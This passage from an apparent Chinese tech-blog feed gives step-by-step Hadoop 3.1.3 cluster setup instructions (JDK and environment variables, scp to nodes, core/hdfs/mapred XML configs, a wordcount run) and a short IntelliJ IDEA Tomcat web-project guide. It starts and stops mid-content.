<h2 id="2-解压JDK"><a href="#2-解压JDK" class="headerlink" title="(2)解压JDK"></a>(2)解压JDK</h2><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">tar</span> -zxvf jdk-<span class="number">8</span>u<span class="number">131</span>-linux-x<span class="number">64</span>.tar.gz</span><br></pre></td></tr></table></figure>
<p><a href="https://imgchr.com/i/DWSo4O"><img src="https://s3.ax1x.com/2020/11/30/DWSo4O.jpg" alt="DWSo4O.jpg"></a></p>
<h2 id="3-配置JDK环境变量"><a href="#3-配置JDK环境变量" class="headerlink" title="(3)配置JDK环境变量"></a>(3)配置JDK环境变量</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">vi <span class="regexp">/etc/</span>profile</span><br></pre></td></tr></table></figure>
<p>根据自己的路径在末尾添加以下内容</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">export JAVA_HOME=<span class="regexp">/opt/bigdata</span><span class="regexp">/java/jdk</span>1.<span class="number">8.0_131</span></span><br><span class="line">export CLASSPATH=.:$JAVA_HOME/<span class="class"><span class="keyword">lib</span>/<span class="title">dt</span>.<span class="title">jar</span>:$<span class="title">JAVA_HOME</span>/<span class="title">lib</span>/<span class="title">tools</span>.<span class="title">jar</span></span></span><br></pre></td></tr></table></figure>
<p><a href="https://imgchr.com/i/DfpjjH"><img src="https://s3.ax1x.com/2020/12/01/DfpjjH.jpg" alt="DfpjjH.jpg"></a></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">source /etc/profile</span><br><span class="line">java -version #检验是否配置成功</span><br></pre></td></tr></table></figure>
<p><a href="https://imgchr.com/i/DfpghT"><img src="https://s3.ax1x.com/2020/12/01/DfpghT.jpg" alt="DfpghT.jpg"></a></p>
<h2 id="4-JDK拷贝到其他节点"><a href="#4-JDK拷贝到其他节点" class="headerlink" title="(4)JDK拷贝到其他节点"></a>(4)JDK拷贝到其他节点</h2><p>在node1节点新建目录/opt/bigdata/java</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">mkdir <span class="regexp">/opt/</span>bigdata/java</span><br></pre></td></tr></table></figure>
<p>然后在master节点下</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">scp -r /opt/bigdata/java/jdk1.<span class="number">8.0_131</span> root<span class="variable">@node1</span><span class="symbol">:/opt/bigdata/java</span></span><br></pre></td></tr></table></figure>
<p>配置环境变量</p>
<font color="ff0000">在其他节点进行类似操作</font>

<h1 id="3-Hadoop安装"><a href="#3-Hadoop安装" class="headerlink" title="3.Hadoop安装"></a>3.Hadoop安装</h1><h2 id="1-安装"><a href="#1-安装" class="headerlink" title="(1)安装"></a>(1)安装</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">tar</span> <span class="selector-tag">-zxvf</span> <span class="selector-tag">hadoop</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></span><br></pre></td></tr></table></figure>
<h2 id="2-将hadoop文件拷贝到其他节点"><a href="#2-将hadoop文件拷贝到其他节点" class="headerlink" title="(2)将hadoop文件拷贝到其他节点"></a>(2)将hadoop文件拷贝到其他节点</h2><h1 id="master-1"><a href="#master-1" class="headerlink" title="master"></a>master</h1><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">scp -r <span class="regexp">/opt/</span>bigdata<span class="regexp">/hadoop-3.1.3/</span>etc<span class="regexp">/hadoop root@node1:/</span>opt<span class="regexp">/bigdata/</span>hadoop-<span class="number">3.1</span>.<span class="number">3</span><span class="regexp">/etc/</span>hadoop</span><br></pre></td></tr></table></figure>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">scp -r /opt/bigdata/hadoop<span class="number">-3.1</span>.<span class="number">3</span> root<span class="variable">@node2</span><span class="symbol">:/opt/bigdata</span></span><br></pre></td></tr></table></figure>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">scp -r /opt/bigdata/hadoop<span class="number">-3.1</span>.<span class="number">3</span> root<span class="variable">@node3</span><span class="symbol">:/opt/bigdata</span></span><br></pre></td></tr></table></figure>
<p>然后在node1、node2、node3中配置环境变量</p>
<h2 id="3-修改配置文件"><a href="#3-修改配置文件" class="headerlink" title="(3)修改配置文件"></a>(3)修改配置文件</h2><p>使用以下命令，进入目录</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cd <span class="regexp">/opt/</span>bigdata<span class="regexp">/hadoop-3.1.3/</span>etc/hadoop</span><br></pre></td></tr></table></figure>
<p>我们需要  core-site.xml、hadoop-env.sh、hdfs-site.xml、mapred-site.xml进行配置</p>
<p>1.配置hadoop-env.sh</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">vi</span> hadoop-env.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure>
<p>查找JAVA_HOME配置的位置</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="symbol">:/export</span> JAVA_HOME</span><br></pre></td></tr></table></figure>
<p>输入JAVA_HOME的绝对路径</p>
<p>export JAVA_HOME=/opt/bigdata/jdk1.8.0_131（把前面的#注释去掉）</p>
<p><a href="https://imgchr.com/i/Df9D2D"><img src="https://s3.ax1x.com/2020/12/01/Df9D2D.jpg" alt="Df9D2D.jpg"></a></p>
<p>2.配置core-site.xml</p>
<p>3.配置hdfs-site.xml</p>
<p>4.配置mapred-site.xml</p>
<p>5.配置yarn-site.xml</p>
<p>6.配置workers</p>
<p>7.复制配置文件</p>
<p>把master节点的配置复制到其他node节点</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">scp <span class="regexp">/opt/</span>bigdata<span class="regexp">/hadoop-3.1.3/</span>etc<span class="regexp">/hadoop/</span>* node1:<span class="regexp">/opt/</span>bigdata<span class="regexp">/hadoop-3.1.3/</span>etc/hadoop</span><br><span class="line">scp <span class="regexp">/opt/</span>bigdata<span class="regexp">/hadoop-3.1.3/</span>etc<span class="regexp">/hadoop/</span>* node2:<span class="regexp">/opt/</span>bigdata<span class="regexp">/hadoop-3.1.3/</span>etc/hadoop</span><br><span class="line">scp <span class="regexp">/opt/</span>bigdata<span class="regexp">/hadoop-3.1.3/</span>etc<span class="regexp">/hadoop/</span>* node3:<span class="regexp">/opt/</span>bigdata<span class="regexp">/hadoop-3.1.3/</span>etc/hadoop</span><br></pre></td></tr></table></figure>
<h2 id="4-配置hadoop环境"><a href="#4-配置hadoop环境" class="headerlink" title="(4)配置hadoop环境"></a>(4)配置hadoop环境</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">vi <span class="regexp">/etc/</span>profile</span><br></pre></td></tr></table></figure>
<p>在文件末尾添加</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">HADOOP_HOME</span>=/opt/bigdata/hadoop-3.1.3</span><br><span class="line"> </span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">HADOOP_LOG_DIR</span>=/opt/bigdata/hadoop-3.1.3/logs</span><br><span class="line"> </span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">YARN_LOG_DIR</span>=<span class="variable">$HADOOP_LOG_DIR</span></span><br><span class="line"></span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">PATH</span>=.:$HADOOP_HOME/sbin:$HADOOP_HOME/bin:$JAVA_HOME/bin:$PATH</span><br></pre></td></tr></table></figure>
<p>执行</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">source /etc/profile</span><br><span class="line">hadoop version</span><br></pre></td></tr></table></figure>
<p>[<img src="https://s3.ax1x.com/2020/11/30/DWSIUK.jpg" alt="DWSIUK.jpg">](</p>
<h2 id="5-检查hadoop搭建情况"><a href="#5-检查hadoop搭建情况" class="headerlink" title="(5)检查hadoop搭建情况"></a>(5)检查hadoop搭建情况</h2><p>1.关闭防火墙（四台虚拟机）</p>
<p>按顺序执行以下命令</p>
<p>使用命令：systemctl status firewalld.service 查看防火墙状态</p>
<p>使用命令：systemctl stop firewalld.service 关闭防火墙</p>
<p>使用命令：systemctl disable firewalld.service 禁止防火墙</p>
<p>2.格式化namenode</p>
<p>第一次启动集群，在master虚拟机的hadoop-3.1.3目录下执行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">bin</span>/hdfs namenode -<span class="built_in">format</span></span><br></pre></td></tr></table></figure>
<p>3.启动</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">start</span>-<span class="keyword">all</span>.sh</span><br></pre></td></tr></table></figure>
<p>如果启动报错</p>
<figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line">[root@iZbp153yczpm4pp9pjs0u3Z sbin]# start-all.sh </span><br><span class="line">Starting namenodes on [hdp<span class="string">-01</span>]</span><br><span class="line"><span class="keyword">ERROR: </span>Attempting to operate on hdfs namenode as root</span><br><span class="line"><span class="keyword">ERROR: </span>but there is no HDFS_NAMENODE_USER defined. Aborting operation.</span><br><span class="line">Starting datanodes</span><br><span class="line"><span class="keyword">ERROR: </span>Attempting to operate on hdfs datanode as root</span><br><span class="line"><span class="keyword">ERROR: </span>but there is no HDFS_DATANODE_USER defined. Aborting operation.</span><br><span class="line">Starting secondary namenodes [47.96.106.223]</span><br><span class="line"><span class="keyword">ERROR: </span>Attempting to operate on hdfs secondarynamenode as root</span><br><span class="line"><span class="keyword">ERROR: </span>but there is no HDFS_SECONDARYNAMENODE_USER defined. Aborting operation.</span><br><span class="line">Starting resourcemanager</span><br><span class="line"><span class="keyword">ERROR: </span>Attempting to operate on yarn resourcemanager as root</span><br><span class="line"><span class="keyword">ERROR: </span>but there is no YARN_RESOURCEMANAGER_USER defined. Aborting operation.</span><br><span class="line">Starting nodemanagers</span><br><span class="line"><span class="keyword">ERROR: </span>Attempting to operate on yarn nodemanager as root</span><br><span class="line"><span class="keyword">ERROR: </span>but there is no YARN_NODEMANAGER_USER defined. Aborting operation.</span><br></pre></td></tr></table></figure>
<p>需要进入hadoop安装目录下的sbin文件夹</p>
<p>1.对于start-dfs.sh和stop-dfs.sh文件，添加下列参数：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">HDFS_DATANODE_USER</span>=root  </span><br><span class="line"><span class="attr">HDFS_DATANODE_SECURE_USER</span>=hdfs  </span><br><span class="line"><span class="attr">HDFS_NAMENODE_USER</span>=root  </span><br><span class="line"><span class="attr">HDFS_SECONDARYNAMENODE_USER</span>=root </span><br></pre></td></tr></table></figure>
<p><a href="https://imgchr.com/i/Df9uEq"><img src="https://s3.ax1x.com/2020/12/01/Df9uEq.jpg" alt="Df9uEq.jpg"></a></p>
<p>2、对于start-yarn.sh和stop-yarn.sh文件，添加下列参数：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line">YARN_RESOURCEMANAGER_USER=root</span><br><span class="line">HADOOP_SECURE_DN_USER=yarn</span><br><span class="line">YARN_NODEMANAGER_USER=root</span><br></pre></td></tr></table></figure>
<p>重新启动即可</p>
<p>4.检查进程</p>
<p>启动之后，在每台虚拟机输入以下命令</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">jps</span></span><br></pre></td></tr></table></figure>
<p>master</p>
<p><a href="https://imgchr.com/i/Df9KU0"><img src="https://s3.ax1x.com/2020/12/01/Df9KU0.jpg" alt="Df9KU0.jpg"></a></p>
<p>node1</p>
<p><a href="https://imgchr.com/i/Df9EvQ"><img src="https://s3.ax1x.com/2020/12/01/Df9EvQ.jpg" alt="Df9EvQ.jpg"></a></p>
<p>node2</p>
<p><a href="https://imgchr.com/i/Df9Zuj"><img src="https://s3.ax1x.com/2020/12/01/Df9Zuj.jpg" alt="Df9Zuj.jpg"></a></p>
<p>node3</p>
<p><a href="https://imgchr.com/i/DfPYA1"><img src="https://s3.ax1x.com/2020/12/01/DfPYA1.jpg" alt="DfPYA1.jpg"></a></p>
<p>5.进入管理页面</p>
<p>在浏览器地址栏中输入以下命令</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>界面</th>
<th>地址</th>
</tr>
</thead>
<tbody>
<tr>
<td>管理页面</td>
<td><a href="http://localhost:8088">http://localhost:8088</a></td>
</tr>
<tr>
<td>NameNode界面</td>
<td><a href="http://localhost:9870">http://localhost:9870</a></td>
</tr>
</tbody>
</table>
</div>
<p><a href="https://imgchr.com/i/D4PDHJ"><img src="https://s3.ax1x.com/2020/12/01/D4PDHJ.jpg" alt="D4PDHJ.jpg"></a></p>
<p><a href="https://imgchr.com/i/D4PsE9"><img src="https://s3.ax1x.com/2020/12/01/D4PsE9.jpg" alt="D4PsE9.jpg"></a></p>
<h1 id="4-Hadoop运行实例"><a href="#4-Hadoop运行实例" class="headerlink" title="4.Hadoop运行实例"></a>4.Hadoop运行实例</h1><p>进入hadoop-3.1.3目录</p>
<p>(1) 创建Input文件夹</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"># hdfs dfs -<span class="keyword">mkdir</span> /<span class="keyword">Input</span></span><br></pre></td></tr></table></figure>
<p>(2) 将test.txt文件上传到hdfs的/Input目录下</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"># hdfs dfs -put LICENSE.txt <span class="regexp">/Input/</span>test.txt</span><br></pre></td></tr></table></figure>
<p>(3) 运行hadoop安装包中自带的wordcount程序</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"># hadoop jar share<span class="regexp">/hadoop/m</span>apreduce<span class="regexp">/hadoop-mapreduce-examples-3.1.3.jar wordcount /I</span>nput<span class="regexp">/test.txt /</span>Output/</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
  </entry>
  <entry>
    <title>IDEA新建Web项目</title>
    <url>/post/f1926f41.html</url>
    <content><![CDATA[<p>　　这个是创建普通javaweb项目的步骤，建议使用maven创建，导包不用这么麻烦<a href="/post/4bd31b3a.html" title="Maven环境变量配置">Maven环境变量配置</a><span id="more"></span></p>
<h1 id="1-创建web-project"><a href="#1-创建web-project" class="headerlink" title="1.创建web project"></a>1.创建web project</h1><p>File-&gt;new Project</p>
<p><img src="https://s3.ax1x.com/2020/12/13/reKhjJ.md.jpg" alt="reKhjJ.md.jpg" style="zoom:50%;" /></p>
<p><img src="https://s3.ax1x.com/2020/12/13/reKW3F.jpg" alt="reKW3F.jpg" style="zoom:50%;" /></p>
<p>之后，在web/WEB-INF文件夹下面创建两个文件夹：classes和lib</p>
<p>lib存放第三方jar包，classes存放编译后输出的class文件</p>
<p>创建好的目录如下</p>
<p><img src="https://s3.ax1x.com/2020/12/13/reKghT.jpg" alt="reKghT.jpg"></p>
<h1 id="2-接下来需要配置文件夹路径"><a href="#2-接下来需要配置文件夹路径" class="headerlink" title="2.接下来需要配置文件夹路径"></a>2.接下来需要配置文件夹路径</h1><p>File-&gt;Project Structure-&gt;选择Module：</p>
<p>在Paths界面修改，把路径修改为刚刚创建的classes文件夹，最后点击Apply</p>
<p><img src="https://s3.ax1x.com/2020/12/13/reKfc4.jpg" alt="reKfc4.jpg" style="zoom:50%;" /></p>
<p>再点击Dependencies-&gt;将Module SDK选择为自己的JDK-&gt;点击右边+号-&gt;选择Jars or Directories</p>
<p><img src="https://s3.ax1x.com/2020/12/13/reK5u9.jpg" alt="reK5u9.jpg" style="zoom:50%;" /></p>
<p>—————————&gt;</p>
<p><img src="https://s3.ax1x.com/2020/12/13/reKIBR.jpg" alt="reKIBR.jpg" style="zoom:50%;" /></p>
<p>—————————&gt;</p>
<p><img src="https://s3.ax1x.com/2020/12/13/reKoH1.jpg" alt="reKoH1.jpg"></p>
<p>然后就OK了</p>
<h1 id="3-配置Tomcat容器"><a href="#3-配置Tomcat容器" class="headerlink" title="3.配置Tomcat容器"></a>3.配置Tomcat容器</h1><p>(1) 打开菜单Run-&gt;选择Edit Configuration，也可以点击上方的Edit Configuration</p>
<p><img src="https://s3.ax1x.com/2020/12/13/reK7Ax.jpg" alt="reK7Ax.jpg" style="zoom:50%;" /></p>
<p>(2) 点击+号-&gt;Tomcat Server-&gt;Local</p>
<p><img src="https://s3.ax1x.com/2020/12/13/reKHN6.jpg" alt="reKHN6.jpg" style="zoom:50%;" /></p>
<p>(3) 在”Name“处创建Tomcat名字，点击”Application server“后面的”Configure“，选择本地安装的Tomcat路径-&gt;OK</p>
<p><img src="https://s3.ax1x.com/2020/12/13/reKb4K.jpg" alt="reKb4K.jpg" style="zoom:50%;" /></p>
<p>(4) 至此，Tomcat部署完成</p>
<p>下一步在Tomcat中部署并运行项目</p>
<p>Run -&gt; Edit Configurations，进入”Run/Debug Configurations”窗口 -&gt; 选择刚刚建立的Tomcat容器 -&gt; 选择Deployment -&gt; 点击右边的“+”号 -&gt; 选择Artifact—&gt;选择web项目—&gt;Application contex填一个名字—&gt;ok.</p>
<p><img src="https://s3.ax1x.com/2020/12/13/reKL9O.jpg" alt="reKL9O.jpg" style="zoom:50%;" /></p>
<p>(5) 编辑Index.jsp文件</p>
<p><img src="https://s3.ax1x.com/2020/12/13/reKXge.jpg" alt="reKXge.jpg" style="zoom:50%;" /></p>
<p>(6) 访问Tomcat项目</p>
<p><img src="https://s3.ax1x.com/2020/12/13/reKO3D.jpg" alt="reKO3D.jpg" style="zoom:50%;" /></p>
<h1 id="4-Web项目结构"><a href="#4-Web项目结构" class="headerlink" title="4.Web项目结构"></a>4.Web项目结构</h1>]]></content>
      <tags>
        <tag>创建项目</tag>
      </tags>
  </entry>
  <entry>
    <title>Hadoop集群环境搭建2</title>
    <url>/post/4496e9f0.html</url>
    <content><![CDATA[<p>　　之前写过一篇hadoop的搭建，见<a href="/post/dd9fb84a.html" title="Hadoop集群环境搭建1">Hadoop集群环境搭建1</a>，但是这个是先安装好每台虚拟机再配置文件。所以，这篇文章采用的是克隆虚拟机的方法，但是还是踩了很多坑，主要就是配置文件的问题，这个搭建完之后，能够简单计算PI的值和运行hadoop自带的包。但是在配置过程中仍然忘记设置虚拟机为静态，踩了很多坑，很烦！不过也了解了很多。<span id="more"></span></p>
<h1 id="1-JDK和Hadoop环境安装"><a href="#1-JDK和Hadoop环境安装" class="headerlink" title="1.JDK和Hadoop环境安装"></a>1.JDK和Hadoop环境安装</h1><h2 id="1-新建目录存放JDK和Hadoop"><a href="#1-新建目录存放JDK和Hadoop" class="headerlink" title="(1) 新建目录存放JDK和Hadoop"></a>(1) 新建目录存放JDK和Hadoop</h2><p>在master中新建目录bigdata</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"># mkdir -p <span class="regexp">/opt/</span>bigdata</span><br></pre></td></tr></table></figure>
<p>将下载好的JDK包和Hadoop包上传至master主机中/opt/bigdata下</p>
<p><a href="https://imgchr.com/i/rPQrM6"><img src="https://s3.ax1x.com/2020/12/09/rPQrM6.jpg" alt="rPQrM6.jpg"></a></p>
<h2 id="2-解压JDK和Hadoop"><a href="#2-解压JDK和Hadoop" class="headerlink" title="(2) 解压JDK和Hadoop"></a>(2) 解压JDK和Hadoop</h2><p>在bigdata目录下执行以下命令</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"># <span class="selector-tag">tar</span> <span class="selector-tag">-zxvf</span> <span class="selector-tag">jdk-8u131-linux-x64</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></span><br></pre></td></tr></table></figure>
<p><a href="https://imgchr.com/i/rPQUIJ"><img src="https://s3.ax1x.com/2020/12/09/rPQUIJ.jpg" alt="rPQUIJ.jpg"></a></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"># <span class="selector-tag">tar</span> <span class="selector-tag">-zxvf</span> <span class="selector-tag">hadoop</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></span><br></pre></td></tr></table></figure>
<h2 id="3-配置JDK和Hadoop环境变量"><a href="#3-配置JDK和Hadoop环境变量" class="headerlink" title="(3) 配置JDK和Hadoop环境变量"></a>(3) 配置JDK和Hadoop环境变量</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">vi <span class="regexp">/etc/</span>profile</span><br></pre></td></tr></table></figure>
<p>根据自己的路径在末尾添加以下内容</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="builtin-name">export</span> <span class="attribute">JAVA_HOME</span>=/opt/bigdata/jdk1.8.0_131</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">CLASSPATH</span>=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">HADOOP_HOME</span>=/opt/bigdata/hadoop-3.1.3</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">PATH</span>=.:$HADOOP_HOME/sbin:$HADOOP_HOME/bin:$JAVA_HOME/bin:$PATH</span><br></pre></td></tr></table></figure>
<p><a href="https://imgchr.com/i/rPQ0R1"><img src="https://s3.ax1x.com/2020/12/09/rPQ0R1.jpg" alt="rPQ0R1.jpg"></a></p>
<p>:wq保存退出</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">source /etc/profile</span><br><span class="line">java -version #检验java是否配置成功</span><br><span class="line">hadoop version #检验hadoop是否配置成功</span><br></pre></td></tr></table></figure>
<p><a href="https://imgchr.com/i/rPQwGR"><img src="https://s3.ax1x.com/2020/12/09/rPQwGR.jpg" alt="rPQwGR.jpg"></a></p>
<h1 id="2-修改配置文件"><a href="#2-修改配置文件" class="headerlink" title="2.修改配置文件"></a>2.修改配置文件</h1><p>首先创建以下目录，方便配置hadoop文件</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">mkdir <span class="regexp">/opt/</span>bigdata<span class="regexp">/hadoop-3.1.3/</span>tmp  		<span class="comment">#用来存放临时文件</span></span><br><span class="line">mkdir <span class="regexp">/opt/</span>bigdata<span class="regexp">/hadoop-3.1.3/</span>logs 		<span class="comment">#用来存放日志文件</span></span><br><span class="line">mkdir <span class="regexp">/opt/</span>bigdata<span class="regexp">/hadoop-3.1.3/</span>hdfs 		<span class="comment">#用来存储集群数据</span></span><br><span class="line">mkdir <span class="regexp">/opt/</span>bigdata<span class="regexp">/hadoop-3.1.3/</span>hdfs/name 	<span class="comment">#用来存储文件系统元数据</span></span><br><span class="line">mkdir <span class="regexp">/opt/</span>bigdata<span class="regexp">/hadoop-3.1.3/</span>hdfs/data 	<span class="comment">#用来存储真正的数据</span></span><br></pre></td></tr></table></figure>
<font color="ff0000">进入目录，以下6个步骤文件都在此目录中</font>

<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cd <span class="regexp">/opt/</span>bigdata<span class="regexp">/hadoop-3.1.3/</span>etc/hadoop</span><br></pre></td></tr></table></figure>
<p>我们需要  core-site.xml、hadoop-env.sh、hdfs-site.xml、mapred-site.xml进行配置</p>
<h2 id="1-配置hadoop-env-sh"><a href="#1-配置hadoop-env-sh" class="headerlink" title="(1) 配置hadoop-env.sh"></a>(1) 配置hadoop-env.sh</h2><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">vi</span> hadoop-env.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure>
<p>查找JAVA_HOME配置的位置</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="symbol">:/export</span> JAVA_HOME</span><br></pre></td></tr></table></figure>
<p>输入JAVA_HOME的绝对路径</p>
<p>export JAVA_HOME=/opt/bigdata/jdk1.8.0_131（把前面的#注释去掉）</p>
<p><a href="https://imgchr.com/i/rPQdi9"><img src="https://s3.ax1x.com/2020/12/09/rPQdi9.jpg" alt="rPQdi9.jpg"></a></p>
<h2 id="2-配置core-site-xml"><a href="#2-配置core-site-xml" class="headerlink" title="(2) 配置core-site.xml"></a>(2) 配置core-site.xml</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">vi</span> <span class="selector-tag">core-site</span><span class="selector-class">.xml</span></span><br></pre></td></tr></table></figure>
<p>在修改为</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.tmp.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>file:/opt/bigdata/hadoop-3.1.3/tmp<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">description</span>&gt;</span>节点上本地的hadoop临时文件夹<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>fs.defaultFS<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>hdfs://master:9000<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">description</span>&gt;</span>HDFS的默认名称<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="3-配置hdfs-site-xml"><a href="#3-配置hdfs-site-xml" class="headerlink" title="(3) 配置hdfs-site.xml"></a>(3) 配置hdfs-site.xml</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">vi</span> <span class="selector-tag">hdfs-site</span><span class="selector-class">.xml</span></span><br></pre></td></tr></table></figure>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.replication<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>3<span class="tag">&lt;/<span class="name">value</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">description</span>&gt;</span>副本个数，默认是3,应小于datanode机器数量<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.name.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>file:/opt/bigdata/hadoop-3.1.3/hdfs/name<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">description</span>&gt;</span>namenode上存储hdfs名字空间元数据 <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.datanode.data.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>file:/opt/bigdata/hadoop-3.1.3/hdfs/data<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">description</span>&gt;</span>datanode上数据块的物理存储位置<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.secondary.http-address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>node2:9001<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="4-配置mapred-site-xml"><a href="#4-配置mapred-site-xml" class="headerlink" title="(4) 配置mapred-site.xml"></a>(4) 配置mapred-site.xml</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.framework.name<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>yarn<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">description</span>&gt;</span>指定mapreduce使用yarn框架<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.application.classpath<span class="tag">&lt;/<span 